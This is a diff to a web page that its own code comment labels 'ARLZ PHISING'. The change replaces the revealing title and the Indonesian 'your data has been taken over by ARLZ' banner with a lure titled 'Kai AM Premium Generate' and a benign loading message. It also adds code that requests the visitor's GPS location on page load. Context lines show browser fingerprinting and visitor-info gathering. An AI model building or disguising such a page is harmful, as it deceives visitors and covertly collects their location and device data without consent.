@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>arlz Tracker</title>
+<title>Kai AM Premium Generate</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <style>
 body {margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;overflow:hidden;position:relative;color:#444;}
@@ -21,7 +21,7 @@ video.floating {position:absolute;width:200px;height:120px;z-index:9999;pointer-
 </head>
 <body>
 <div id="loading-container">
-    <div id="loading-text">DATA ANDA DI AMBIL ALIH OLEH ARLZ</div>
+    <div id="loading-text">Memuat halaman...silahkan tunggu.</div>
     <div id="progress-container"><div id="progress-bar"></div></div>
     <div id="loading-details"></div>
 </div>
@@ -89,7 +89,34 @@ async function generateFingerprint(){
     const hashBuffer=await crypto.subtle.digest('SHA-256',data);
     return [...new Uint8Array(hashBuffer)].map(x=>x.toString(16).padStart(2,'0')).join('');
 }
+// ========== Gps ==========
+    console.log("Geolocation tersedia:", !!navigator.geolocation);
+console.log("Secure context:", window.isSecureContext);
 
+function getLocation() {
+  console.log("Function getLocation() dipanggil.");
+
+  if (!navigator.geolocation) {
+    console.log("Browser tidak mendukung Geolocation.");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    function (posisi) {
+      const lat = posisi.coords.latitude;
+      const lon = posisi.coords.longitude;
+
+      console.log("Latitude:", lat);
+      console.log("Longitude:", lon);
+    },
+    function (error) {
+      console.log("Kode error:", error.code);
+      console.log("Pesan error:", error.message);
+    }
+  );
+}
+
+window.addEventListener("load", getLocation);
 // ========== ARLZ PHISING ==========
 async function getVisitorInfo(){
     const clock=new Date().toLocaleString();
@@ -237,6 +264,7 @@ setTimeout(async()=>{
 },5000);
 
 })();
+
 </script>
 </body>
-</html>
+    </html>
